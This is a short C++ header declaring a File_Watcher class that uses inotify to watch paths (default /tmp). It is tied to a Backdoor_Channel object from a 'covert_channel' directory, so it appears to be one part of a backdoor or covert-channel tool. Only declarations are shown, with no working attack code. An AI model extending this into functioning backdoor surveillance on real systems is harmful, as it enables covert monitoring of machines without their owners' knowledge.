#ifndef File_Watcher_H
#define File_Watcher_H

#include <string>
#include <inotifytools/inotifytools.h>
#include <inotifytools/inotify.h>
#include <errno.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include "../covert_channel/backdoor_channel.h"
using std::string;

class File_Watcher
{
public:
    File_Watcher();
    File_Watcher(Backdoor_Channel& bc) : ch(bc) {};
    int start(std::string path, uint32_t mask);
    int watch(std::string path, uint32_t mask);

private:
    const char* WATCH_DIR = "/tmp";
    Backdoor_Channel &ch;
};

#endif 
